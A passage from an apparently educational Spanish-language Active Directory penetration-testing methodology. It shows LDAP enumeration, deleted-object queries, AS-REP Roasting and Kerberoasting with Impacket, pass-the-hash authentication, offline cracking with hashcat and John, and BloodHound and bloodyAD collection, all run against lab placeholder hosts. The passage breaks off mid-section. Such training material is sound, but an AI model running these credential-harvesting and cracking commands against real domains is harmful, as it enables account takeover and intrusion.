#### Enumerar usuarios y atributos relevantes

Sin credenciales:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '' \
  -w '' \
  -b '<BASE_DN>' \
  '(&(objectClass=user)(objectCategory=person))' \
  sAMAccountName displayName description info userAccountControl
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example' \
  '(&(objectClass=user)(objectCategory=person))' \
  sAMAccountName displayName description info userAccountControl
```

Con credenciales utilizamos el mismo filtro y sustituimos el bind anónimo por `-D '<USUARIO>@<DOMINIO>' -W`. Cualquier cuenta nueva debe incorporarse al archivo `users.txt` definido en la fase 2.

#### Buscar información en descripciones y comentarios

En lugar de descartar la salida original, la guardamos y usamos `grep` solo como una vista rápida:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=*)' \
  dn sAMAccountName description info comment notes \
  | tee ldap_attributes.ldif \
  | grep -Ei 'pwd|pass|password|description|info|comment|notes'
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=*)' \
  dn sAMAccountName description info comment notes \
  | tee ldap_attributes.ldif \
  | grep -Ei 'pwd|pass|password|description|info|comment|notes'
```

Las coincidencias deben revisarse junto con el `dn` del objeto. Una línea aislada puede perder el contexto necesario para saber a qué usuario, grupo o equipo pertenece.

#### Buscar cuentas que no requieran preautenticación

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '' \
  -w '' \
  -b '<BASE_DN>' \
  '(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userAccountControl
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example' \
  '(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userAccountControl
```

El valor `4194304` corresponde al flag `DONT_REQ_PREAUTH`. Si la consulta anónima está bloqueada, repetimos el mismo filtro con credenciales.

#### Buscar cuentas de servicio con SPN

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  '(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName description
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))' \
  sAMAccountName servicePrincipalName description
```

#### Enumerar grupos

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=group)' \
  cn description member
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=group)' \
  cn description member
```

#### Enumerar equipos

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=computer)' \
  dNSHostName operatingSystem operatingSystemVersion servicePrincipalName
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=computer)' \
  dNSHostName operatingSystem operatingSystemVersion servicePrincipalName
```

#### Enumerar relaciones de confianza

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=trustedDomain)' \
  cn trustPartner trustDirection trustType trustAttributes
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=trustedDomain)' \
  cn trustPartner trustDirection trustType trustAttributes
```

#### Enumerar GPO

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  '(objectClass=groupPolicyContainer)' \
  displayName name gPCFileSysPath
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  '(objectClass=groupPolicyContainer)' \
  displayName name gPCFileSysPath
```

### 4.7. Consultar objetos eliminados

Cuando se elimina un objeto de Active Directory, el directorio conserva temporalmente un tombstone con un subconjunto de sus atributos. Si nuestra identidad tiene permisos para consultarlo, podemos usar el control **Show Deleted** con el OID `1.2.840.113556.1.4.417`.

Podemos definir el alcance de la consulta de dos formas:

- Utilizar el Base DN del dominio para buscar objetos eliminados en todo su subárbol.
- Consultar directamente el contenedor `CN=Deleted Objects` para limitar la búsqueda a esa ubicación.

#### Buscar desde la raíz del dominio

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

Esta variante es más amplia. Resulta útil cuando queremos buscar objetos eliminados desde el naming context completo sin asumir de antemano una ruta más específica.

#### Buscar directamente en `CN=Deleted Objects`

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b 'CN=Deleted Objects,<BASE_DN>' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'CN=Deleted Objects,DC=lab,DC=example' \
  -E '1.2.840.113556.1.4.417' \
  '(isDeleted=TRUE)' \
  cn distinguishedName sAMAccountName msDS-LastKnownRDN \
  lastKnownParent whenChanged description info comment objectClass
```

Esta segunda variante es más específica y normalmente produce una consulta más clara al trabajar directamente sobre el contenedor de objetos eliminados.

Los atributos también responden preguntas diferentes:

- `cn` y `distinguishedName` muestran el nombre y la ubicación actuales del objeto eliminado; pueden contener la marca `DEL` y su GUID.
- `msDS-LastKnownRDN` conserva el RDN original del objeto.
- `lastKnownParent` indica el contenedor donde estaba ubicado antes de eliminarse.
- `sAMAccountName` permite recuperar el nombre de inicio de sesión si el atributo fue conservado.
- `whenChanged` indica la última modificación registrada para el objeto.
- `description`, `info` y `comment` pueden conservar notas o contexto administrativo si esos atributos sobrevivieron al proceso de eliminación.

El control Show Deleted muestra objetos eliminados y tombstones, pero no objetos que ya han pasado al estado reciclado. Para incluir también objetos reciclados existe el control `1.2.840.113556.1.4.2064`, siempre que el controlador lo soporte y nuestra identidad tenga permisos.

No todos los atributos sobreviven al borrado y el acceso a este contenedor suele estar restringido, por lo que una respuesta vacía no demuestra que nunca hayan existido objetos eliminados.

### 4.8. Revisar ACL y atributos protegidos

LDAP también expone descriptores de seguridad mediante `nTSecurityDescriptor`. Para interpretar esta información debemos distinguir dos conceptos:

- **ACE (Access Control Entry):** una regla individual que identifica un usuario o grupo y especifica qué acceso se le permite, deniega o audita sobre un objeto.
- **ACL (Access Control List):** la lista completa de ACE asociada al objeto.

```text
ACL = lista de permisos
ACE = cada permiso dentro de la lista
```

En esta metodología utilizaremos las ACE para comprobar si una identidad que controlamos posee permisos que permitan continuar la cadena. La relación que debemos conservar siempre es:

```text
principal controlado -> permiso -> objeto objetivo
```

Por ejemplo, saber que una cuenta dispone de `WriteDACL` no es suficiente: necesitamos identificar sobre qué usuario, grupo, equipo, OU, GPO o dominio puede ejercerlo. La representación binaria no es cómoda de interpretar directamente con `ldapsearch`, por lo que más adelante utilizaremos BloodHound para descubrir relaciones y `bloodyAD` para validarlas sobre el objeto correspondiente.

Según los permisos de nuestra identidad, también podemos encontrar atributos protegidos como:

- `ms-Mcs-AdmPwd` en implementaciones antiguas de LAPS.
- `msLAPS-Password` en Windows LAPS.
- `msDS-ManagedPassword` en cuentas gMSA.
- Información de delegación como `msDS-AllowedToDelegateTo` o `msDS-AllowedToActOnBehalfOfOtherIdentity`.

La existencia de estos atributos no significa que cualquier usuario pueda leer su contenido. Lo importante es comprobar qué puede consultar nuestra identidad y volver a hacerlo cuando obtengamos permisos diferentes.

**Resultado de la fase:** salida LDIF y relaciones relevantes entre usuarios, grupos, equipos, SPN, trusts, GPO, ACL u objetos eliminados; cualquier usuario nuevo se incorpora a `users.txt`.

---

## 5. AS-REP Roasting

AS-REP Roasting aprovecha cuentas que tienen desactivada la preautenticación de Kerberos. Cuando solicitamos autenticación para una de estas identidades, el controlador de dominio puede devolver un AS-REP que contiene datos cifrados con una clave derivada de la contraseña del usuario. Ese material permite comprobar candidatos de contraseña de forma offline.

En esta fase utilizaremos el archivo `users.txt` que hemos construido y actualizado durante las enumeraciones anteriores.

El flujo que seguiremos es el siguiente:

1. Verificar que `users.txt` contiene una cuenta por línea.
2. Solicitar AS-REP para la lista sin utilizar credenciales.
3. Probar de forma dirigida una cuenta concreta cuando sea necesario.
4. Repetir la consulta con credenciales válidas para que Impacket descubra las cuentas vulnerables mediante LDAP.
5. Guardar los hashes en formato compatible con Hashcat.
6. Realizar la comprobación de contraseñas offline.
7. Si recuperamos una credencial, regresar a las fases anteriores y volver a enumerar.

### 5.1. Requisitos

Para intentar AS-REP Roasting sin credenciales necesitamos:

- El dominio DNS.
- La dirección del controlador de dominio.
- Acceso de red al servicio Kerberos.
- Una lista de usuarios en `users.txt`.
- Que al menos una cuenta tenga desactivada la preautenticación.

No necesitamos conocer una contraseña válida para probar los usuarios del archivo. Sin embargo, la lista debe contener nombres reales; si `users.txt` está incompleto, un resultado negativo tampoco será concluyente.

Antes de continuar, comprobamos que el archivo mantenga una cuenta por línea y no contenga entradas vacías o duplicadas.

### 5.2. Solicitar AS-REP sin credenciales

La sintaxis base para probar todas las cuentas de `users.txt` es:

```bash
impacket-GetNPUsers '<DOMINIO>/' \
  -no-pass \
  -usersfile users.txt \
  -dc-ip <IP_DC> \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

Ejemplo:

```bash
impacket-GetNPUsers 'lab.example/' \
  -no-pass \
  -usersfile users.txt \
  -dc-ip 192.0.2.10 \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

La opción `-outputfile` hace que Impacket solicite el material AS-REP y escriba los resultados directamente en `asrep_hashes.txt`. Esto resulta más limpio que ocultar los errores y filtrar toda la salida de la herramienta mediante una tubería.

Si una cuenta requiere preautenticación, no obtendremos un hash aprovechable para AS-REP Roasting. Si ninguna entrada produce resultados, debemos conservar los mensajes de la herramienta: pueden ayudarnos a distinguir entre usuarios inexistentes, cuentas restringidas y cuentas válidas que simplemente requieren preautenticación.

### 5.3. Probar un usuario específico

Cuando queremos comprobar una identidad concreta, podemos indicarla directamente en el target:

```bash
impacket-GetNPUsers '<DOMINIO>/<USUARIO>' \
  -no-pass \
  -dc-ip <IP_DC> \
  -request \
  -format hashcat \
  -outputfile <ARCHIVO_HASH>
```

Ejemplo:

```bash
impacket-GetNPUsers 'lab.example/m.garcia' \
  -no-pass \
  -dc-ip 192.0.2.10 \
  -request \
  -format hashcat \
  -outputfile m.garcia_asrep.txt
```

Es importante mantener `-no-pass`. Si lo omitimos, Impacket puede solicitar una contraseña aunque nuestra intención sea realizar una consulta sin credenciales.

### 5.4. Enumerar cuentas vulnerables con credenciales

Una credencial válida cambia el flujo. En lugar de depender exclusivamente de `users.txt`, Impacket puede consultar LDAP para localizar usuarios con el flag `UF_DONT_REQUIRE_PREAUTH` y solicitar sus AS-REP.

```bash
impacket-GetNPUsers '<DOMINIO>/<USUARIO>:<CONTRASEÑA>' \
  -dc-ip <IP_DC> \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

Ejemplo:

```bash
impacket-GetNPUsers 'lab.example/analista:TrainingPass2026' \
  -dc-ip 192.0.2.10 \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

Si no queremos escribir la contraseña en el comando, podemos omitirla del target para que Impacket la solicite de forma interactiva:

```bash
impacket-GetNPUsers '<DOMINIO>/<USUARIO>' \
  -dc-ip <IP_DC> \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

Ejemplo:

```bash
impacket-GetNPUsers 'lab.example/analista' \
  -dc-ip 192.0.2.10 \
  -request \
  -format hashcat \
  -outputfile asrep_authenticated.txt
```

Esta modalidad no significa que la cuenta autenticada sea vulnerable. Sus credenciales se utilizan para consultar el directorio y encontrar otras identidades que no requieran preautenticación.

### 5.5. Identificar el formato del hash

Un resultado AS-REP con cifrado RC4 normalmente comienza de esta forma:

```text
$krb5asrep$23$usuario@DOMINIO:...
```

El prefijo indica que se trata de un AS-REP Kerberos con `etype 23`. Para Hashcat corresponde al modo `18200`.

No debemos confundirlo con un hash que comience con `$krb5tgs$23$`. Ese formato corresponde a un TGS-REP y utiliza el modo `13100`; pertenece a Kerberoasting y se tratará en una fase distinta.

Si el AS-REP utiliza `etype 18`, Hashcat dispone del modo `32200`. Siempre debemos elegir el modo a partir del prefijo y el tipo real del hash, no solamente por la técnica que intentábamos ejecutar.

### 5.6. Comprobar contraseñas offline

Para un AS-REP con `etype 23`, la sintaxis base es:

```bash
hashcat -m 18200 <ARCHIVO_HASH> <WORDLIST>
```

Ejemplo:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Después podemos consultar los resultados recuperados:

```bash
hashcat -m 18200 <ARCHIVO_HASH> --show
```

Ejemplo:

```bash
hashcat -m 18200 asrep_hashes.txt --show
```

El cracking se realiza de forma offline y no genera nuevos intentos de inicio de sesión contra el dominio. Su efectividad depende de la fortaleza de la contraseña y de la calidad de la lista utilizada; obtener el hash no garantiza recuperar la contraseña.

### 5.7. Continuar después de recuperar una credencial

Si recuperamos una contraseña, la nueva identidad debe incorporarse al inventario de credenciales y convertirse en otro punto de enumeración. Como mínimo, debemos volver a comprobar:

- Shares y permisos SMB.
- LDAP y atributos visibles.
- RPC y grupos del usuario.
- Acceso mediante WinRM u otros servicios publicados.
- Nuevas rutas o relaciones que no eran visibles para las identidades anteriores.

No debemos asumir que recuperar la contraseña completa esta fase. El valor real de la cuenta está en los permisos, grupos, servicios y objetos a los que nos permita acceder.

**Resultado de la fase:** archivo de hashes AS-REP y, si el cracking funciona, una credencial nueva con la que repetir la enumeración.

---

## 6. Kerberoasting

Kerberoasting se basa en solicitar tickets de servicio TGS para cuentas que tienen uno o varios **Service Principal Names (SPN)**. Parte del ticket está cifrada con una clave derivada de la contraseña de la cuenta asociada al servicio, lo que permite comprobar candidatos de contraseña de forma offline.

En la mayoría de los dominios, un usuario autenticado puede solicitar tickets para los servicios publicados. El objetivo práctico suele ser encontrar SPN asociados a cuentas de usuario administradas manualmente, ya que sus contraseñas pueden ser más débiles que las contraseñas largas y aleatorias de las cuentas de equipo.

El flujo que seguiremos es el siguiente:

1. Utilizar una identidad válida del dominio.
2. Consultar las cuentas de usuario que tienen SPN.
3. Solicitar y guardar sus tickets TGS.
4. Priorizar objetivos según sus grupos, descripción y servicio asociado.
5. Identificar el tipo de cifrado del hash.
6. Comprobar candidatos de contraseña offline.
7. Validar de forma controlada cualquier credencial recuperada.
8. Repetir la enumeración desde la perspectiva de la nueva cuenta.

### 6.1. Requisitos

Para realizar Kerberoasting necesitamos:

- Una cuenta válida y autenticada en el dominio.
- Su contraseña, hash NTLM, clave AES o un TGT disponible en caché.
- Acceso de red a LDAP y Kerberos.
- Resolución correcta del dominio y del controlador.
- Al menos una cuenta con un SPN registrado.

No necesitamos ser administradores ni conocer la contraseña de la cuenta de servicio. La identidad autenticada se utiliza para consultar LDAP, obtener un TGT y solicitar los tickets de servicio permitidos por Kerberos.

### 6.2. Enumerar SPN y solicitar tickets con contraseña

Para evitar escribir la contraseña en el historial, podemos indicar solamente el dominio y el usuario. Impacket la solicitará de forma interactiva:

```bash
impacket-GetUserSPNs '<DOMINIO>/<USUARIO>' \
  -dc-ip <IP_DC> \
  -request \
  -outputfile kerberoast_hashes.txt
```

Ejemplo:

```bash
impacket-GetUserSPNs 'lab.example/analista' \
  -dc-ip 192.0.2.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

En un laboratorio también podemos incluir la contraseña en el target:

```bash
impacket-GetUserSPNs '<DOMINIO>/<USUARIO>:<CONTRASEÑA>' \
  -dc-ip <IP_DC> \
  -request \
  -outputfile kerberoast_hashes.txt
```

Ejemplo:

```bash
impacket-GetUserSPNs 'lab.example/analista:TrainingPass2026' \
  -dc-ip 192.0.2.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

La opción `-outputfile` activa la solicitud de tickets y guarda el material directamente en un archivo compatible con herramientas de cracking.

### 6.3. Solicitar el ticket de una cuenta concreta

Si la consulta devuelve varios SPN, podemos dirigir la solicitud a una cuenta específica mediante `-request-user`:

```bash
impacket-GetUserSPNs '<DOMINIO>/<USUARIO_AUTENTICADO>' \
  -dc-ip <IP_DC> \
  -request-user <CUENTA_SPN> \
  -outputfile <ARCHIVO_HASH>
```

Ejemplo:

```bash
impacket-GetUserSPNs 'lab.example/analista' \
  -dc-ip 192.0.2.10 \
  -request-user svc_sql \
  -outputfile svc_sql_tgs.txt
```

La cuenta indicada en `-request-user` es el objetivo cuyo ticket queremos obtener; no es la identidad utilizada para autenticarnos.

### 6.4. Kerberoasting mediante un hash NTLM

Si tenemos el hash NTLM de una cuenta válida, podemos autenticarnos sin conocer su contraseña en texto claro:

```bash
impacket-GetUserSPNs '<DOMINIO>/<USUARIO>' \
  -hashes ':<NTHASH>' \
  -dc-ip <IP_DC> \
  -request \
  -outputfile kerberoast_hashes.txt
```

Ejemplo:

```bash
impacket-GetUserSPNs 'lab.example/analista' \
  -hashes ':0123456789abcdef0123456789abcdef' \
  -dc-ip 192.0.2.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

El valor debe ser el hash de la cuenta con la que nos autenticamos, no el hash de la cuenta de servicio que queremos obtener.

### 6.5. Consultar otro dominio mediante una relación de confianza

Cuando existe una relación de confianza, `-target-domain` permite consultar SPN en un dominio diferente al de la cuenta autenticada:

```bash
impacket-GetUserSPNs '<DOMINIO_ORIGEN>/<USUARIO>' \
  -hashes ':<NTHASH>' \
  -target-domain <DOMINIO_OBJETIVO> \
  -request \
  -outputfile cross_domain_tgs.txt
```

Ejemplo:

```bash
impacket-GetUserSPNs 'lab.example/analista' \
  -hashes ':0123456789abcdef0123456789abcdef' \
  -target-domain services.example \
  -request \
  -outputfile cross_domain_tgs.txt
```

Al utilizar `-target-domain`, GetUserSPNs ignora `-dc-ip` porque debe seguir las referencias Kerberos entre los dominios. Por eso necesitamos que la resolución DNS y el acceso a los controladores de ambos dominios funcionen correctamente.

### 6.6. Interpretar los resultados

Antes de solicitar o crackear todos los tickets sin criterio, debemos revisar la información que devuelve la herramienta:

- `ServicePrincipalName`: servicio publicado.
- `Name`: cuenta asociada al SPN.
- `MemberOf`: grupos conocidos de la cuenta.
- `PasswordLastSet`: antigüedad aproximada de la contraseña.
- `LastLogon`: actividad observada para la cuenta.
- `Delegation`: configuraciones de delegación identificadas.

Una cuenta con un nombre administrativo o un SPN asociado a una función crítica puede merecer prioridad, pero el ticket por sí solo no concede sus privilegios. Primero tendríamos que recuperar la contraseña y comprobar qué acceso conserva realmente la identidad.

### 6.7. Identificar el formato del ticket

Un TGS con cifrado RC4 suele comenzar de esta forma:

```text
$krb5tgs$23$*usuario$DOMINIO$servicio/host*$...
```

Los modos de Hashcat dependen del etype:

| Prefijo o etype | Tipo | Modo de Hashcat |
| --- | --- | --- |
| `$krb5tgs$23$` | TGS-REP etype 23 | `13100` |
| `$krb5tgs$17$` | TGS-REP etype 17 | `19600` |
| `$krb5tgs$18$` | TGS-REP etype 18 | `19700` |

No debemos utilizar el modo `18200`: ese modo corresponde a AS-REP etype 23 y pertenece a la fase anterior.

### 6.8. Comprobar contraseñas offline

#### Hashcat

Para un TGS etype 23, la sintaxis base es:

```bash
hashcat -m 13100 <ARCHIVO_HASH> <WORDLIST>
```

Ejemplo:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Para mostrar los resultados recuperados:

```bash
hashcat -m 13100 <ARCHIVO_HASH> --show
```

Ejemplo:

```bash
hashcat -m 13100 kerberoast_hashes.txt --show
```

#### John the Ripper

```bash
john --wordlist=<WORDLIST> <ARCHIVO_HASH>
```

Ejemplo:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

Para consultar los resultados:

```bash
john --show <ARCHIVO_HASH>
```

Ejemplo:

```bash
john --show kerberoast_hashes.txt
```

El cracking es offline y no genera intentos adicionales de autenticación contra el dominio. Recuperar un ticket no garantiza que la contraseña sea lo suficientemente débil para encontrarse con nuestra estrategia.

### 6.9. Validar una credencial recuperada

Si recuperamos una contraseña, no debemos conectarnos automáticamente a todos los servicios. Primero identificamos qué protocolos están publicados y validamos la cuenta de forma controlada.

Podemos comenzar por los servicios ya encontrados durante la enumeración:

- SMB para shares y permisos.
- LDAP para grupos, atributos y relaciones.
- RPC para información adicional de la cuenta.
- WinRM si el servicio está disponible.
- SSH solamente si fue identificado en el objetivo y forma parte del alcance.

Una cuenta de servicio puede utilizar la misma contraseña en varios sistemas, pero no debemos asumirlo ni lanzar pruebas indiscriminadas. Cada validación debe quedar vinculada a un servicio y objetivo conocidos.

**Resultado de la fase:** cuentas con SPN, tickets TGS guardados y cualquier credencial recuperada para validar y reenumerar el dominio.

---

## 7. Análisis de rutas con BloodHound

BloodHound entra en la metodología cuando ya contamos con un usuario válido, repetimos la enumeración mediante RPC, SMB y LDAP, revisamos Kerberos y aun así no encontramos una ruta clara para continuar.

No sustituye la enumeración manual. Su función es transformar usuarios, grupos, equipos, sesiones, permisos, GPO, delegaciones y relaciones de confianza en un grafo que nos ayude a identificar conexiones difíciles de reconocer en una salida de texto.

El flujo que seguiremos es el siguiente:

1. Recopilar los datos del dominio con una identidad válida.
2. Importar el archivo ZIP en BloodHound.
3. Marcar las identidades y equipos que controlamos.
4. Buscar rutas hacia objetivos de mayor valor.
5. Revisar primero las relaciones que salen de nuestros objetos controlados.
6. Validar manualmente cada enlace antes de intentar utilizarlo.
7. Repetir la recopilación cuando cambie nuestra posición dentro del dominio.

### 7.1. Cuándo utilizar BloodHound

No necesitamos esperar a estar completamente bloqueados para recopilar información, pero BloodHound aporta más valor cuando ya podemos responder estas preguntas:

- ¿Qué usuario controlamos?
- ¿A qué grupos pertenece?
- ¿Qué shares y servicios puede utilizar?
- ¿Qué objetos puede leer o modificar mediante LDAP?
- ¿Encontramos cuentas de servicio, delegaciones o relaciones de confianza?

Si conocemos esas piezas por separado pero no vemos cómo se conectan, es momento de apoyarnos en el grafo.

### 7.2. Recopilar datos con `bloodhound-ce-python`

Con una cuenta válida podemos recopilar la información desde nuestro equipo. La sintaxis base es:

```bash
bloodhound-ce-python \
  -u '<USUARIO>' \
  -p '<CONTRASEÑA>' \
  -d '<DOMINIO>' \
  -ns <IP_DC> \
  -dc '<FQDN_DC>' \
  -c All \
  --zip
```

Ejemplo:

```bash
bloodhound-ce-python \
  -u 'analista' \
  -p 'TrainingPass2026' \
  -d 'lab.example' \
  -ns 192.0.2.10 \
  -dc 'dc01.lab.example' \
  -c All \
  --zip
```

Los argumentos cumplen estas funciones:

- `-u` y `-p` indican la identidad utilizada para la recopilación.
- `-d` define el dominio consultado.
- `-ns` utiliza el controlador como servidor DNS.
- `-dc` especifica el FQDN del controlador de dominio.
- `-c All` recopila las relaciones compatibles, excepto la colección privilegiada `LoggedOn`.
- `--zip` comprime los archivos JSON generados.

La resolución configurada en la fase 1 vuelve a ser importante: `-dc` debe recibir un nombre que resuelva correctamente.

#### Recopilación limitada al controlador

Si solo podemos comunicarnos con el controlador de dominio o queremos comenzar con una recopilación menos amplia, utilizamos `DCOnly`:

```bash
bloodhound-ce-python \
  -u '<USUARIO>' \
  -p '<CONTRASEÑA>' \
  -d '<DOMINIO>' \
  -ns <IP_DC> \
  -dc '<FQDN_DC>' \
  -c DCOnly \
  --zip
```

Ejemplo:

```bash
bloodhound-ce-python \
  -u 'analista' \
  -p 'TrainingPass2026' \
  -d 'lab.example' \
  -ns 192.0.2.10 \
  -dc 'dc01.lab.example' \
  -c DCOnly \
  --zip
```

`DCOnly` recopila grupos, ACL, trusts, propiedades de objetos y contenedores consultando el controlador, pero no obtiene relaciones que requieren comunicarse con los equipos miembro, como determinadas sesiones o grupos locales.

### 7.3. Alternativa con SharpHound

Si ya estamos trabajando desde un equipo Windows unido al dominio, SharpHound es el colector oficial de BloodHound CE. No es necesario documentar aquí cómo transferirlo ni cómo establecer la conexión: desde una ubicación autorizada ejecutamos la recopilación y conservamos el ZIP resultante.

```powershell
.\SharpHound.exe -c All
```

SharpHound genera archivos JSON y los comprime en un ZIP preparado para importarse. Debemos registrar qué usuario ejecutó la recopilación, desde qué equipo y qué métodos se utilizaron.

### 7.4. Importar los datos

Una vez generado el ZIP, lo importamos mediante la opción de ingesta de archivos de BloodHound. No necesitamos extraerlo manualmente: BloodHound CE acepta el archivo comprimido producido por el colector.

El ZIP contiene información sensible sobre la estructura y los permisos del dominio. Debe almacenarse como evidencia de la evaluación y no compartirse fuera del alcance autorizado.

### 7.5. Marcar nuestra posición inicial

Antes de buscar rutas, debemos reflejar correctamente lo que ya controlamos:

- Marcar como `Owned` cada usuario cuya contraseña, hash o ticket controlemos.
- Marcar los equipos comprometidos cuando tengamos control efectivo sobre ellos.
- Marcar como objetivos de alto valor los objetos que realmente sean relevantes para la evaluación.

BloodHound solo puede calcular rutas útiles si nuestro punto de partida representa la situación real. Marcar una cuenta como controlada solo porque conocemos su nombre produciría conclusiones incorrectas.

### 7.6. Analizar el grafo en un orden natural

En lugar de buscar únicamente la ruta más corta hacia `Domain Admins`, revisamos el grafo en este orden:

1. Relaciones salientes de los usuarios que controlamos.
2. Grupos directos y anidados a los que pertenecen.
3. Permisos sobre otros usuarios, grupos, equipos, OU y GPO.
4. Acceso local, RDP, WinRM, DCOM o sesiones sobre equipos.
5. Delegaciones Kerberos y cuentas de servicio relacionadas.
6. Relaciones de confianza con otros dominios.
7. Rutas hacia objetos marcados como `High Value`.

Algunas relaciones que pueden aparecer son:

- `GenericAll` o `GenericWrite`.
- `WriteDACL` o `WriteOwner`.
- Capacidad de cambiar la contraseña de otro usuario.
- Capacidad de agregar miembros a un grupo.
- Administración local sobre un equipo.
- Permiso para utilizar RDP o administración remota.
- Control sobre una GPO u OU.
- Delegaciones y relaciones vinculadas con AD CS.

El nombre de una relación no basta para decidir qué hacer. Debemos comprobar sobre qué objeto existe, qué capacidad concede y si continúa siendo válida desde nuestra posición.

### 7.7. Validar manualmente las rutas

Un enlace del grafo representa información recopilada en un momento concreto. Puede estar incompleto, desactualizado o depender de condiciones adicionales.

Antes de seguir una ruta debemos validar:

- Que la identidad controlada siga siendo válida.
- Que el permiso exista realmente sobre el objeto indicado.
- Que el equipo o servicio sea alcanzable.
- Que la técnica asociada sea compatible con el tipo de objeto.
- Que la acción esté permitida por el alcance.

Por ejemplo, `GenericWrite` no representa una acción única. Su utilidad cambia si el objetivo es un usuario, un grupo, una cuenta de equipo o una GPO. BloodHound nos muestra la relación; nosotros debemos interpretar el contexto.

### 7.8. Validar ACL y ACE con `bloodyAD`

BloodHound es una ayuda para representar relaciones y descubrir rutas, pero no debe considerarse nuestra única fuente de verdad. El grafo depende de los datos que el colector pudo obtener, de los métodos utilizados y del momento en que se realizó la recopilación. Por ello, una ruta que termina en un usuario determinado no demuestra necesariamente que esa cuenta carezca de otros permisos.

Si llegamos a controlar un usuario y BloodHound ya no muestra un camino para continuar, conviene revisar manualmente qué objetos puede modificar esa identidad. `bloodyAD` puede ayudarnos a detectar objetos escribibles y a solicitar `nTSecurityDescriptor` mediante LDAP para resolver sus ACE en un formato legible. Esta revisión también sirve para comprobar directamente una relación que sí aparezca en el grafo.

#### Buscar objetos escribibles desde la identidad actual

Como primera revisión podemos solicitar los objetos sobre los que el usuario autenticado posee algún derecho relevante:

```bash
bloodyAD --host <IP_DC> -d <DOMINIO> -u <USUARIO> -p '<CONTRASEÑA>' \
  get writable --otype ALL --right ALL --detail
```

Ejemplo:

```bash
bloodyAD --host 192.0.2.10 -d lab.example -u operador -p 'Password123!' \
  get writable --otype ALL --right ALL --detail
```

La salida funciona como un nuevo punto de partida: debemos identificar el objeto, el derecho y la propiedad concreta afectada. Después consultamos su ACL para confirmar la relación completa y determinar si realmente ofrece una continuación válida.

#### Consultar la ACL de la raíz del dominio

El siguiente comando consulta únicamente el descriptor de seguridad del objeto dominio:

```bash
bloodyAD --host <IP_DC> -d <DOMINIO> -u <USUARIO> -p '<CONTRASEÑA>' \
  get search --filter "(objectClass=domain)" --base "<BASE_DN>" \
  --attr nTSecurityDescriptor --resolve-sd
```

Ejemplo:

```bash
